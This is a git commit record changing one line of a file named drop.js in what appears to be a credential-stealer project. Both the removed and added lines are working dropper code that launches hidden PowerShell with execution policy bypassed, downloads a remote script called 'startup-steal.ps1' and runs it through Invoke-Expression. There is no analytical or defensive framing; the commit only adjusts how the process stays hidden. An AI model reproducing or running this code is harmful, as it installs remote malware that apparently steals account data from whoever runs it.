5ea7001646bf01c7e249b667eff076ddffbd2097
43a1723 <hai1723notgay@gmail.com>
2024-09-19 16:37:22 +0700

    Update drop.js

--- scr/drop.js
+++ scr/drop.js
@@ -1,1 +1,1 @@
-require('child_process').exec('powershell -nop -ep bypass -w hidden -c "iwr -useb https://raw.githubusercontent.com/s1uiasdad/log-acc-v2/refs/heads/main/scr/startup-steal.ps1 | iex"', { detached: true, stdio: 'ignore' });
+require('child_process').exec('start "" /B powershell -nop -ep bypass -c "iwr -useb https://raw.githubusercontent.com/s1uiasdad/log-acc-v2/refs/heads/main/scr/startup-steal.ps1 | iex"', { detached: true, stdio: 'ignore' });
